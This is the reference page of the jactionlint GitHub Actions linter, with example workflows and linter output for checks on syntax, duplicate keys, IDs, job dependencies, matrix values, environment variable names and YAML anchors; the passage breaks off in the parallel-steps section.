All checks done by jactionlint
==============================

jactionlint reports every finding with the ID of the rule that found it at the end of the line. This page describes each check: what it reports, an example input with the real output, and how to fix or configure it. Look a rule up with `jactionlint --explain RULE`, which prints its section of this page in your terminal, or find it by topic in the list below.

**How to read a section.**

- A heading that ends in **(pedantic)**, **(online)**, **(opt-in)** or **(online, opt-in)** names a check that is off by default. A pedantic check runs only under the `pedantic` profile, an online check runs only with the [online checks](online.md), and an opt-in check runs only after you configure it. [Rules](rules.md) lists the group, default level, profile and fix of every rule ID.
- An example is a small workflow with the output that jactionlint prints for it. The examples run with a shared configuration that turns off a few rules that every short example would break, such as `missing-timeout` and `unpinned-uses`, so that the output shows the check of the section. To see one rule on your own file, run `jactionlint --select RULE`. The playground link under an example opens it in the [online playground](https://jactionlint.jdx.dev/playground).
- To turn a rule off, set `RULE: off` under `rules` in [the configuration file](config.md#rules). To silence one finding, see [Ignore findings](ignore.md).

**Checks by topic.**

**Workflow structure and YAML**

- [Unexpected keys](#check-unexpected-keys)
- [Missing required keys and key duplicates](#check-missing-required-duplicate-keys)
- [Unexpected empty mappings](#check-empty-mapping)
- [Unexpected mapping values](#check-mapping-values)
- [ID naming convention](#id-naming-convention)
- [Job ID and step ID uniqueness](#check-job-step-ids)
- [Job dependencies validation](#check-job-deps)
- [Matrix values](#check-matrix-values)
- [Environment variable names](#check-env-var-names)
- [YAML anchors](#yaml-anchors)
- [Parallel steps](#check-parallel-step-refs)
- [Background step results read before a wait](#check-background-step-not-waited)

**Expressions and contexts**

- [Syntax check for expression `${{ }}`](#check-syntax-expression)
- [Expressions written with the wrong delimiters](#check-malformed-expression-delimiters)
- [Type checks for expression syntax in `${{ }}`](#check-type-check-expression)
- [Strict type checks for comparison operators](#check-comparison-types)
- [Contexts and built-in functions](#check-contexts-and-builtin-func)
- [Contextual typing for `steps.<step_id>` objects](#check-contextual-step-object)
- [Contextual typing for `matrix` object](#check-contextual-matrix-object)
- [Contextual typing for `needs` object](#check-contextual-needs-object)
- [Contextual typing for `github.event` object](#check-contextual-github-event)
- [Expressions for a whole mapping or list](#check-whole-value-expressions)
- [Availability of contexts and special functions](#ctx-spfunc-availability)
- [Constant conditions at `if:`](#if-cond-constant)
  - [Require `${{ }}` in `if:` conditions (pedantic)](#check-require-expression-wrapping)
  - [Falsy value in the `a && b || c` ternary idiom](#check-falsy-ternary)

**Triggers and events**

- [Webhook events validation](#check-webhook-events)
- [Workflow dispatch event validation](#check-workflow-dispatch-events)
- [Glob filter pattern syntax validation](#check-glob-pattern)
- [Path filters that match no file (pedantic)](#check-unmatched-paths-filter)
- [CRON syntax and IANA timezone string at `on.schedule`](#check-cron-syntax-and-timezone)
- [Workflow names of `workflow_run` event](#check-workflow-run-names)
- [Duplicate triggers](#check-duplicate-triggers)
- [Events that the workflow never receives (pedantic)](#check-event-name-never-received)

**Jobs, runners and concurrency**

- [Runner labels](#check-runner-labels)
- [Limits of ubuntu-slim](#check-ubuntu-slim-limits)
- [Mutable runner labels (pedantic)](#check-mutable-runner-label)
- [Deprecated runner labels (pedantic)](#check-deprecated-runner-label)
- [Self-hosted runners (pedantic)](#check-self-hosted-runner)
- [Timeout minutes of jobs](#check-timeout-minutes)
- [Concurrency limits](#check-concurrency-limits)
- [Concurrency that cancels unrelated pull requests](#check-concurrency-cancels-prs)
- [Concurrency that cancels a release](#check-concurrency-cancels-release)
- [Gate jobs that are skipped when a job fails](#check-gate-job-skipped-on-failure)
- [Failures hidden by continue-on-error (pedantic)](#check-continue-on-error)
- [Unused job outputs](#check-unused-job-output)
- [Needs entries that do nothing (pedantic)](#check-unused-needs)

**Scripts and shells**

- [Shell name validation at `shell:`](#check-shell-names)
- [shellcheck integration for `run:`](#check-shellcheck-integ)
- [Syntax errors in shell scripts without shellcheck](#check-shell-syntax)
- [pyflakes integration for `run:`](#check-pyflakes-integ)
- [JavaScript syntax of `actions/github-script`](#check-github-script-syntax)
- [Scripts folded into one line](#check-multiline-plain-run)
- [Pipelines that hide failures](#check-pipeline-without-pipefail)
- [GNU-only options on macOS runners (pedantic)](#check-macos-gnu-flags)
- [Writes to the environment files that lose data](#check-environment-file-redirect)
- [Deprecated workflow commands](#check-deprecated-workflow-commands)
- [Insecure workflow commands](#check-insecure-commands)
- [The gh command without a token](#check-gh-without-token)

**Actions in steps**

- [Action format in `uses:`](#check-action-format)
  - [Tags of immutable releases (online)](#check-immutable-release)
  - [GitHub Actions lock file](#check-actions-lock)
  - [Local action used before checkout](#check-local-action-checkout)
- [Self-repository syntax (pedantic)](#check-self-repository)
- [Local action inputs validation at `with:`](#check-local-action-inputs)
- [Popular action inputs validation at `with:`](#check-popular-action-inputs)
- [Inputs which only work together](#check-action-input-dependencies)
- [Inputs and outputs of any action (online)](#check-remote-action-metadata)
- [Deprecated inputs usage](#deprecated-inputs-usage)
- [Popular actions with a runner that is too old](#outdated-popular-actions-detection-at-uses)
- [Node.js runtimes that GitHub removed (pedantic)](#check-deprecated-node-runtime)
- [Metadata of local actions](#action-metadata-syntax-validation)
- [Actions that do not fail by default (pedantic)](#check-fail-fast-action-inputs)
- [Superfluous actions](#check-superfluous-actions)
- [Misfeatures](#check-misfeature)

**Reusable workflows**

- [Reusable workflows](#check-reusable-workflows)
  - [Reusable workflows of other repositories (online)](#check-remote-reusable-workflows)
- [Concurrency deadlock between a workflow and the workflow it calls](#check-concurrency-deadlock)
- [Unused workflow inputs (pedantic)](#check-unused-workflow-input)
- [Unused workflow secrets (pedantic)](#check-unused-workflow-secret)

**Permissions and tokens**

- [Permissions](#permissions)
- [Excessive permissions](#check-excessive-permissions)
- [Insufficient permissions](#check-insufficient-permissions)
- [Undocumented permissions (pedantic)](#check-undocumented-permissions)
- [GitHub App tokens](#check-github-app)

**Secrets and credentials**

- [Hardcoded credentials](#check-hardcoded-credentials)
- [Static credentials for actions/checkout](#check-checkout-static-credentials)
- [Persisted checkout credentials](#check-artipacked)
- [Inherited secrets](#check-secrets-inherit)
- [Overprovisioned secrets](#check-overprovisioned-secrets)
- [Unredacted secrets](#check-unredacted-secrets)
- [Secrets outside an environment (pedantic)](#check-secrets-outside-env)
- [Workflow-level secrets (pedantic)](#check-workflow-secret-scope)

**Untrusted input and privileged workflows**

- [Script injection by potentially untrusted inputs](#untrusted-inputs)
  - [Container options, Docker steps and AI agent inputs](#check-template-injection-sinks)
- [Inputs, payloads, release names and branch names](#check-template-injection-inputs)
- [Expansions in scripts (pedantic)](#check-template-injection-expansion)
- [Dangerous writes to `GITHUB_ENV` and `GITHUB_PATH`](#check-github-env)
- [Input of an outsider that a script runs as code (pedantic)](#check-command-injection)
- [Input of an outsider that adds records to `GITHUB_OUTPUT` (pedantic)](#check-output-clobbering)
- [Free text of an outsider in the program or the options of a command (pedantic)](#check-argument-injection)
- [AI agent actions](#check-agentic-actions)
- [Dangerous triggers](#check-dangerous-triggers)
- [Comment triggers without a check of the user (pedantic)](#check-comment-trigger-authorization)
- [Untrusted code in privileged workflows](#check-untrusted-checkout)
  - [Environments without reviewers (online)](#check-untrusted-checkout-environment)
- [Untrusted artifacts in workflow_run workflows](#check-untrusted-artifact)
- [Cache poisoning](#check-cache-poisoning)
- [Bots trusted by `github.actor`](#check-bot-conditions)
- [Unsound contains() on a string](#check-unsound-contains)
- [Unsound prefix matches on names](#check-unsound-prefix-match)
- [Obfuscated paths and expressions](#check-obfuscation)
- [Invisible characters](#check-invisible-characters)

**Supply chain: pinning, downloads and publishing**

- [Unpinned container images](#check-unpinned-images)
- [Tools installed without an exact version](#check-unpinned-tools)
- [Packages installed by name](#check-adhoc-packages)
- [Installs without a lock file](#check-unlocked-install)
- [Unverified downloads](#check-unverified-download)
- [Insecure URL schemes](#check-insecure-url-scheme)
- [Host keys collected with ssh-keyscan](#check-insecure-ssh-keyscan)
- [Publishing with long-lived credentials](#check-use-trusted-publishing)
- [Typosquatting of actions](#check-typosquat-uses)
- [Forbidden actions (opt-in)](#check-forbidden-uses)
- [Impostor commits (online)](#check-impostor-commit)
- [Known vulnerable actions (online)](#check-known-vulnerable-actions)
- [Ref confusion (online)](#check-ref-confusion)
- [Stale action refs (online)](#check-stale-action-refs)
- [Pins that do not hold (online)](#check-unpinnable-action)
- [Archived repositories (online)](#check-archived-uses)
- [Repojacking (online)](#check-repojacking)
- [Version comments of pinned actions (online)](#check-ref-version-mismatch)
- [Pinned actions without a version comment (pedantic)](#check-missing-version-comment)
- [Release cooldown of actions (online, opt-in)](#check-action-release-cooldown)

**Policy and style**

- [Run script policy (pedantic)](#check-run-policy)
- [Workflow and job names (pedantic)](#check-anonymous-definition)
- [Ignore comments that suppress nothing](#ignore-comments-that-suppress-nothing-pedantic)

**Dependabot configuration**

- [Dependabot configuration syntax](#check-dependabot-syntax)
- [Dependabot cooldown](#check-dependabot-cooldown)
- [Dependabot insecure code execution](#check-dependabot-execution)
- [Dependabot registry credentials in plain text](#check-hardcoded-registry-credentials)
- [Dependabot updates of actions (pedantic)](#check-dependabot-missing-actions-update)

**Composite actions and action files**

- [Composite actions](#check-composite-actions)
- [Composite action syntax](#check-composite-action-syntax)

<a id="check-unexpected-keys"></a>
## Unexpected keys

The rule `workflow-syntax` reports a key that the syntax of GitHub Actions workflows does not define in the mapping it appears in, such as a misspelled `defaults:` or a `Shell:` with a capital letter.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    # ERROR: Typo of `defaults:`
    default:
      run:
        working-directory: /path/to/dir
    steps:
      - run: echo hello
        # ERROR: `shell:` must be in lower case
        Shell: bash
```

Output:

```
test.yaml:6:5: unexpected key "default" for "job" section. expected one of "cache-mode", "cancel-timeout-minutes", "concurrency", "container", "continue-on-error", "defaults", "env", "environment", "if", "name", "needs", "outputs", "permissions", "runs-on", "secrets", "services", "snapshot", "steps", "strategy", "timeout-minutes", "uses", "with" [workflow-syntax]
  |
6 |     default:
  |     ^~~~~~~~
test.yaml:12:9: unexpected key "Shell" for step to run shell command. expected one of "background", "continue-on-error", "env", "id", "if", "name", "run", "shell", "timeout-minutes", "working-directory" [workflow-syntax]
   |
12 |         Shell: bash
   |         ^~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNo8jEEOAiEMRfdzin8Bwp5reAIYqqCEEtrGeHsDcVy1zXuv3AOGSTmenCQcgJLomsC0Lm5xS9bVXIuLbZTpHq39vG1eK/Dm+ar94XKddCrPT4AfUYtX9rnO7YnSkCtxuwedhVGoNf6/uq0zIEUp3wEAtPsxjA==)

The [workflow syntax](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions) defines which keys each mapping accepts, and a key that it does not define makes the workflow fail. The message lists the keys that the mapping accepts, so a typo is easy to spot.

Key names are case-sensitive: `Shell:` is not `shell:`. GitHub compares some names without regard to case, among them job IDs, step IDs and matrix names (see [Missing required keys and key duplicates](#check-missing-required-duplicate-keys)).

**Related.** `workflow-syntax` is the rule ID of the findings about the syntax of a workflow file that have no rule of their own: a [missing required key](#check-missing-required-duplicate-keys), an [empty mapping](#check-empty-mapping), an [unexpected value](#check-mapping-values) and the specific syntax findings of other checks, such as an unknown input type in [Workflow dispatch event validation](#check-workflow-dispatch-events).

<a id="check-missing-required-duplicate-keys"></a>
## Missing required keys and key duplicates

The rule `duplicate-key` reports a key that is defined twice in a mapping, and `workflow-syntax` reports a mapping that lacks a key it requires, such as `runs-on:` in a job.

Example input:

```yaml
on: push
jobs:
  test:
    strategy:
      # ERROR: Matrix name is duplicated. These keys are case-insensitive
      matrix:
        version_name: [v1, v2]
        VERSION_NAME: [V1, V2]
    # ERROR: runs-on is missing
    steps:
      - run: echo 'hello'
```

Output:

```
test.yaml:3:3: "runs-on" section is missing in job "test" [workflow-syntax]
  |
3 |   test:
  |   ^~~~~
test.yaml:8:9: key "VERSION_NAME" is duplicated in "matrix" section. previously defined at line 7, column 9. note that this key is case insensitive [duplicate-key]
  |
8 |         VERSION_NAME: [V1, V2]
  |         ^~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNo8zLEKwkAQhOE+TzFdmljEcjuLFBZGULgmSDhl8SLJbbjdHPr2Ihqr4eeDkUiYFw3FQ65KBWCs9llALXnj++tbwOQtDc+1gMxJB4l99BMTulxXyNvLn11zOu+Pbd/uDg2hc3UF92M1nnU92iAtkcC3ICgDj6OU7wEANm8osg==)

Some mappings must include specific keys. A job that does not call a reusable workflow must have `runs-on:` and `steps:`, for example.

Duplicate keys are not allowed. GitHub compares some keys without regard to case, so the job IDs `test` and `TEST` cannot both exist in one workflow, and neither can the matrix names `version_name` and `VERSION_NAME`. The message names the line and column of the first definition. Step IDs are not mapping keys: see [Job ID and step ID uniqueness](#check-job-step-ids).

<a id="check-empty-mapping"></a>
## Unexpected empty mappings

The rule `workflow-syntax` reports a mapping or a sequence that must not be empty but is, such as `jobs:` without a job or `steps:` without a step.

Example input:

```yaml
on: push
jobs:
```

Output:

```
test.yaml:2:6: "jobs" section should not be empty. please remove this section if it's unnecessary [workflow-syntax]
  |
2 | jobs:
  |      ^
```

[Playground](https://jactionlint.jdx.dev/#eNrKz7NSKCgtzuDKyk8qtgIMACULBOo=)

Some mappings and sequences need at least one entry. An empty `jobs:`, an empty `steps: []` and an empty element of `steps:` are reported. The message points at the empty node and says to remove the section when it is not needed.

<a id="check-mapping-values"></a>
## Unexpected mapping values

The rule `workflow-syntax` reports a value of the wrong kind for a key that accepts only a boolean, an integer, a number or fixed strings.

Example input:

```yaml
on: push
jobs:
  test:
    strategy:
      # ERROR: Boolean value "true" or "false" is expected
      fail-fast: off
      # ERROR: Integer value is expected
      max-parallel: 1.5
    runs-on: ubuntu-latest
    steps:
      - run: sleep 200
        # ERROR: Float value is expected
        timeout-minutes: two minutes
```

Output:

```
test.yaml:6:18: expecting a single ${{...}} expression or boolean literal "true" or "false", but found plain text node [workflow-syntax]
  |
6 |       fail-fast: off
  |                  ^~~
test.yaml:8:21: expected scalar node for integer value but found scalar node with "!!float" tag [workflow-syntax]
  |
8 |       max-parallel: 1.5
  |                     ^~~
test.yaml:13:26: expecting a single ${{...}} expression or float number literal, but found plain text node [workflow-syntax]
   |
13 |         timeout-minutes: two minutes
   |                          ^~~
```

[Playground](https://jactionlint.jdx.dev/#eNo0zEEKAjEMheH9nOJdoDIKbnKbDKQ6kmlLk6DeXqp1Fd5P+GohtLD78qib0QK4mI8LmHd2ub1/C8i8a8psTqg5z3jwKzXurCpKOJ+u396jWBp0bFE8kvJgpyrN/mQanwRTkYbLus4M+H5IDU/HXsLFCP6smOMzAGy5NWY=)

Keys such as `fail-fast:` expect a boolean, `max-parallel:` an integer and `timeout-minutes:` a number. Only `true` and `false` are booleans, so `fail-fast: off` is reported. A single `${{ }}` expression is accepted in place of a literal. Some keys accept only fixed strings, such as the `type:` of an input of [`workflow_dispatch`](#check-workflow-dispatch-events). The message says what was expected and what was found.

<a id="id-naming-convention"></a>
## ID naming convention

The rule `invalid-id` reports a job ID or a step ID that does not follow the naming convention, and a job ID listed in `needs:` that does not.

Example input:

```yaml
on: push

jobs:
  # ERROR: '.' cannot be contained in ID
  foo-v1.2.3:
    runs-on: ubuntu-latest
    steps:
      - run: echo 'job ID with version'
        # ERROR: ID cannot contain spaces
        id: echo for test
  # ERROR: ID cannot start with '-'
  -hello-world-:
    runs-on: ubuntu-latest
    steps:
      - run: echo 'oops'
  # ERROR: ID cannot start with numbers
  2d-game:
    runs-on: ubuntu-latest
    steps:
      - run: echo 'oops'
```

Output:

```
test.yaml:5:3: invalid job ID "foo-v1.2.3". job ID must start with a letter or _ and contain only alphanumeric characters, -, or _ [invalid-id]
  |
5 |   foo-v1.2.3:
  |   ^~~~~~~~~~~
test.yaml:10:13: invalid step ID "echo for test". step ID must start with a letter or _ and contain only alphanumeric characters, -, or _ [invalid-id]
   |
10 |         id: echo for test
   |             ^~~~
test.yaml:12:3: invalid job ID "-hello-world-". job ID must start with a letter or _ and contain only alphanumeric characters, -, or _ [invalid-id]
   |
12 |   -hello-world-:
   |   ^~~~~~~~~~~~~~
test.yaml:17:3: invalid job ID "2d-game". job ID must start with a letter or _ and contain only alphanumeric characters, -, or _ [invalid-id]
   |
17 |   2d-game:
   |   ^~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqkzTEOgzAMheGdU7yNyUilG3OXHgOKaUBpHooTuH6VNjdgtPzp/QwD9myuaTZONjTAQspx6/ruXi4g5mBSWJ5ySFn8mNTS72VJd/srQIocoC9HtBsnPB841+RwaLSVoa0OWOfKFkbUMXHqPeVk9LNcCJO7lVI/y3v86NWl7wCDIlSH)

An ID must start with a letter or `_` and contain only alphanumeric characters, `-` or `_`. An ID that contains a `${{ }}` expression is not checked. A repeated ID is a different check: see [Job ID and step ID uniqueness](#check-job-step-ids).

**Fix.** Rename the ID, then update the `needs:` entries and the `steps.<id>` and `needs.<id>` expressions that use it.

<a id="check-job-step-ids"></a>
## Job ID and step ID uniqueness

The rule `duplicate-step-id` reports a step ID that is not unique within its job. A job ID that is defined twice is reported as `duplicate-key`.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo 'hello'
        id: step_id
      - run: echo 'bye'
        # ERROR: Duplicate step ID
        id: STEP_ID
  # ERROR: Duplicate job ID
  TEST:
    runs-on: ubuntu-latest
    steps:
      - run: echo 'hello'
        # OK. Step ID uniqueness is job-local
        id: step_id
```

Output:

```
test.yaml:10:13: step ID "STEP_ID" duplicates. previously defined at line 7, column 13. step ID must be unique within a job. note that step ID is case insensitive [duplicate-step-id]
   |
10 |         id: STEP_ID
   |             ^~~~~~~
test.yaml:12:3: key "TEST" is duplicated in "jobs" section. previously defined at line 3, column 3. note that this key is case insensitive [duplicate-key]
   |
12 |   TEST:
   |   ^~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNrKz7NSKCgtzuDKyk8qtuJSUChJLS4B0QoKRaV5xbog+dKk0rySUt2cRJAcWKq4JLWgGKJKQUEXpNJKITU5I19BPSM1JydfHSqjoJCZYgVWHJ+Zgk11UmUqqtrgENeAeE8XLgWFENfgEJq4AzAAioFDag==)

A step ID must be unique within its job, and the same step ID may appear in another job. A job ID must be unique within the workflow. IDs are compared without regard to case, so `step_id` and `STEP_ID` are the same ID, as are `test` and `TEST`. Each finding names the line and column of the first definition.

**Related.** [ID naming convention](#id-naming-convention) checks that an ID has a valid form. A repeated job ID is reported as `duplicate-key`, as in the example; [Job dependencies validation](#check-job-deps) says how it relates to the rule `duplicate-job-id`.

<a id="check-job-deps"></a>
## Job dependencies validation

The rules `cyclic-job-needs`, `undefined-job-needs` and `duplicate-job-needs` report `needs:` lists that cannot work: jobs that need each other in a cycle, a needed job that does not exist and a job that is listed twice.

Example input:

```yaml
on: push
jobs:
  prepare:
    needs: [build]
    runs-on: ubuntu-latest
    steps:
      - run: echo 'prepare'
  install:
    needs: [prepare]
    runs-on: ubuntu-latest
    steps:
      - run: echo 'install'
  build:
    needs: [install]
    runs-on: ubuntu-latest
    steps:
      - run: echo 'build'
```

Output:

```
test.yaml:3:3: cyclic dependencies in "needs" job configurations are detected. detected cycle is "prepare" -> "build" -> "install" -> "prepare" [cyclic-job-needs]
  |
3 |   prepare:
  |   ^~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqkjjEOwyAMRXdO8TcmLsBVqg7QWEoqZBC2719BvWTOZvn5v+/OGcPkDN9eJQdgTBpl0hoBJjok41Xtasd7r6axpJWyaqyWWlES3UiUhvyDQFqXGfQ5O6JLYwAuFi2t3f3OHzS4djXsZ+9+pw/8Wxp/AwC/J1vk)

Job dependencies are defined at [`needs:`](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#jobsjob_idneeds). When the dependencies form a cycle, none of the jobs in it can start. The finding names the cycle, starting at the job that comes first in the file.

The check reports one cycle for a workflow. It looks for a cycle only when every `needs:` entry names an existing job, so a cycle shows up after the undefined jobs are fixed.

The check also reports a needed job that does not exist (`undefined-job-needs`) and a job that is listed twice in `needs:` (`duplicate-job-needs`). Job IDs are compared without regard to case: in this example `bar` and `BAR` are the same job.

Example input:

```yaml
on: push
jobs:
  foo:
    needs: [bar, BAR]
    runs-on: ubuntu-latest
    steps:
      - run: echo 'hi'
  bar:
    needs: [unknown]
    runs-on: ubuntu-latest
    steps:
      - run: echo 'hi'
```

Output:

```
test.yaml:4:18: job ID "BAR" duplicates in "needs" section. note that job ID is case insensitive [duplicate-job-needs]
  |
4 |     needs: [bar, BAR]
  |                  ^~~~
test.yaml:8:3: job "bar" needs job "unknown" which does not exist in this workflow [undefined-job-needs]
  |
8 |   bar:
  |   ^~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqkjDsOAjEMRPucYrptyAXcwRFoEUUMRuEjexXb4vooS0VNNdLMvGdKWNN7eRg7FeBmNgNQkasTTtzGDof98by1I9XrhJJTI+urhXhsk4es/mWBOp8EuXTD0u9LAbiNX3PqU+2t/4k/AwB6DTh7)

A job ID that is defined twice is reported as `duplicate-key` (see [Job ID and step ID uniqueness](#check-job-step-ids)): the parser finds the repeated key before this check runs and drops the second job. The rule `duplicate-job-id` of this check is meant for the same mistake, but a repeated job ID of a workflow file never reaches it.

**Related.** A `needs:` entry that is not a valid job ID is reported by [ID naming convention](#id-naming-convention). A `needs:` entry that does nothing is reported by [Needs entries that do nothing (pedantic)](#check-unused-needs).

<a id="check-matrix-values"></a>
## Matrix values

The rules `matrix-duplicate-value` and `matrix-invalid-exclude` report a matrix that lists a value twice and an `exclude:` entry that matches nothing in the matrix.

Example input:

```yaml
on: push
jobs:
  test:
    strategy:
      matrix:
        node: [10, 12, 14, 14]
        os: [ubuntu-latest, macos-latest]
        exclude:
          - node: 13
            os: ubuntu-latest
          - node: 10
            platform: ubuntu-latest
    runs-on: ${{ matrix.os }}
    steps:
      - run: echo ...
```

Output:

```
test.yaml:6:28: duplicate value "14" is found in matrix "node". the same value is at line 6, column 24 [matrix-duplicate-value]
  |
6 |         node: [10, 12, 14, 14]
  |                            ^~~
test.yaml:9:19: value "13" in "exclude" does not match in matrix "node" combinations. possible values are "10", "12", "14", "14" [matrix-invalid-exclude]
  |
9 |           - node: 13
  |                   ^~
test.yaml:12:13: "platform" in "exclude" section does not exist in matrix. available matrix configurations are "node", "os" [matrix-invalid-exclude]
   |
12 |             platform: ubuntu-latest
   |             ^~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpskMGOhCAQRO9+RR32KER298SvmD2gsuNMlDY0JE6M/z4h4jgmHggpqHrpanIaU+S+eFDDugCC5ZBugIM3wd6emwJGE/x93hXgqLMatapKqO8S6jedv/c3sUYdm+hCFINJ2BKjaYmzOpx2bofY2YMMiExXPx+PG/OEvIpUp8g0mPBPfrwK+uhYpA18LUuuJ4mxrrm/nXgfSiSzhm17gpTyNQBUwlNB)

[`matrix:`](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#jobsjob_idstrategymatrix) defines combinations of values. `include:` adds combinations and `exclude:` removes them.

**What is reported.**

- A value that appears twice in one row of the matrix (`matrix-duplicate-value`).
- An `exclude:` entry whose key is not a row of the matrix, whose value is not one of the values of its row, or that belongs to a matrix without rows (`matrix-invalid-exclude`). An entry may name only some properties of an object value.
- An `exclude:` entry for a value that only `include:` adds. GitHub processes `include:` after `exclude:`, so such a value cannot be excluded.

**What is not reported.** A matrix that is one `${{ }}` expression, a row whose values are an expression and an `exclude:` value that contains an expression are not compared, because their values are not known.

**Related.** [Contextual typing for `matrix` object](#check-contextual-matrix-object) describes how `matrix.<name>` expressions are typed.

<a id="check-env-var-names"></a>
## Environment variable names

The rule `invalid-env-var-name` reports an environment variable name under `env:` that contains `=`, `&`, a space or a tab.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    env:
      FOO=BAR: foo
      FOO BAR: foo
    steps:
      - run: echo 'hello'
```

Output:

```
test.yaml:6:7: environment variable name "FOO=BAR" is invalid. '&', '=' and spaces should not be contained [invalid-env-var-name]
  |
6 |       FOO=BAR: foo
  |       ^~~~~~~~
test.yaml:7:7: environment variable name "FOO BAR" is invalid. '&', '=' and spaces should not be contained [invalid-env-var-name]
  |
7 |       FOO BAR: foo
  |       ^~~
```

[Playground](https://jactionlint.jdx.dev/#eNrKz7NSKCgtzuDKyk8qtuJSUChJLS4B0QoKRaV5xbog+dKk0rySUt2cRJAcWCo1rwyiRkHBzd/f1skxyEohLT8fIaSAIlRcklpQDNOgCzLYSiE1OSNfQT0jNScnXx0wAPhYJMc=)

`=` cannot be part of the name of an environment variable. In almost all cases a name with `&` or a space is a mistake too, and in a shell these characters have a special meaning.

The check covers the `env:` of the workflow, of a job, of a step and of the container and the services of a job. A name that contains a `${{ }}` expression is skipped, and so is an `env:` that is one expression.

<a id="yaml-anchors"></a>
## YAML anchors

The rules `unused-anchor`, `recursive-alias` and `merge-key` report mistakes with YAML anchors and aliases in a workflow, and `yaml-syntax` reports an alias whose anchor is not defined.

GitHub Actions [supports](https://github.blog/changelog/2025-09-18-actions-yaml-anchors-and-non-public-workflow-templates/) YAML [anchor and alias nodes](https://yaml.org/spec/1.2.2/#71-alias-nodes), and jactionlint checks them in workflows.

jactionlint checks the content under an anchor. When an alias node refers to an anchor that has a finding, jactionlint checks the alias as if it were replaced with the anchor node. One anchor node may be checked several times, so jactionlint may report several similar findings at the same source location.

Example input:

```yaml
on: push

jobs:
  test:
    services:
      nginx:
        image: nginx:latest
        credentials: &credentials
          # ERROR: Credentials are embedded directly in workflow
          username: my-user-name
          password: P@ssw0rd
          # ERROR: Unexpected key 'email'
          email: me@example.com
      redis:
        image: redis:latest
        credentials: *credentials
    runs-on: ubuntu-latest
    steps:
      - run: ./do_something.sh
```

Output:

```
test.yaml:11:21: "password" section in "nginx" service should be specified via secrets. do not put password value directly [hardcoded-container-credentials]
   |
11 |           password: P@ssw0rd
   |                     ^~~~~~~~
test.yaml:11:21: "password" section in "redis" service should be specified via secrets. do not put password value directly [hardcoded-container-credentials]
   |
11 |           password: P@ssw0rd
   |                     ^~~~~~~~
test.yaml:13:11: unexpected key "email" for "credentials" section. expected one of "password", "username" [workflow-syntax]
   |
13 |           email: me@example.com
   |           ^~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNp8kM1KxDAUhfd9irNyIaS6zmoewTeQTHNpI703JSdxxreXMLUUBVfhOz/kcLN5bI3LMHzkK/0AVGHtL0Apn2kSPgiwOdn9B4CkYRa/q2vovcObikSxmsJKj6cTHQmgUYoFFQ/9ch1cp1NgC+Qtl+jxdiFvryWeTNGQVg+Vi9yDbquMU9bdLxIT/wx9qP8Nff49tDSj6ydq12a1uVOZVbbjD9eTHuNLzO/MKnVJNo9cvgcAl3xngQ==)

jactionlint also checks the use of anchors and aliases. This example has an unused anchor (`unused-anchor`) and a recursive alias (`recursive-alias`). Its output also has two `workflow-syntax` findings: the anchored `env:` has no value, and the alias `*recursive` stands where `env:` needs a mapping.

Example input:

```yaml
on: push

jobs:
  test:
    services:
      nginx:
        image: nginx:latest
        credentials: &credentials
          username: ${{ secrets.user }}
          password: ${{ secrets.password }}
    runs-on: ubuntu-latest
    steps:
      - run: ./download.sh
        # OK: Valid alias to &credentials
        env: *credentials
      - run: ./upload.sh
        # ERROR: Unused anchor 'credentials'
        env: &credentials
      - &recursive
        run: ./some_script.sh
        # ERROR: Recursively referencing the anchor
        env: *recursive
```

Output:

```
test.yaml:18:14: anchor "credentials" is defined but not used [unused-anchor]
   |
18 |         env: &credentials
   |              ^~~~~~~~~~~~
test.yaml:18:14: expecting a single ${{...}} expression or mapping value for "env" section, but found plain text node [workflow-syntax]
   |
18 |         env: &credentials
   |              ^~~~~~~~~~~~
test.yaml:22:14: "env" section is alias node but mapping node is expected [workflow-syntax]
   |
22 |         env: *recursive
   |              ^~~~~~~~~~
test.yaml:22:14: recursive alias "recursive" is found. anchor was declared at line 19, column 9 [recursive-alias]
   |
22 |         env: *recursive
   |              ^~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpsj8FqwzAQRO/+ijkUHwp27/qZothLomKvxI7kFEL+vYjGwiE5mRm/p92N6pAKL133E090HZCFuX4Bim1hEv4nQM9Bf/cAhNWfxT3axVev/ZtMZtEc/EKH/pAaARSKqV/F4eN2A2UyyRxri/v9wCVPXqPNz9ze7qwV5VCvKaeiuQyHhZgltSOGSjqMX3O86hL9PPLSholuDp+v6zappLdK/07pTaZiDJs0+PEK4yrfnCyk/Dq9WX8DAAHceU8=)

An alias whose anchor is not defined is a YAML syntax error, which is reported as `yaml-syntax` at the alias. `yaml-syntax` is also the rule ID for any other workflow file that is not valid YAML.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: ./download.sh
        # ERROR: &credentials is not defined
        env: *credentials
```

Output:

```
test.yaml:9:14: could not parse as YAML: unknown anchor 'credentials' referenced [yaml-syntax]
  |
9 |         env: *credentials
  |              ^~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNosyjEOwjAMheE9p3gzUsqe26TEUkGRXeXZcH1k6PQP/2facAaPUl62sxXAhZ4FVihrgthDPers+X6LLif/CqgpG7b7sI9O62PjcS1A9N1weywZov7sk98BAKp1Iic=)

A `<<:` key that merges the mapping of an alias into another mapping is reported as `merge-key`, because GitHub Actions does not support the YAML merge key: `GitHub Actions does not support YAML merge key "<<"`. Write the merged keys in the mapping instead.

<a id="check-parallel-step-refs"></a>
## Parallel steps

The rule `invalid-parallel-step` reports a `wait` or `cancel` step that names a step which is not an earlier background step, and a step that is not allowed inside a `parallel` group.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Start server
        id: server
        run: echo 'start'
        background: true
      - run: echo 'tests'
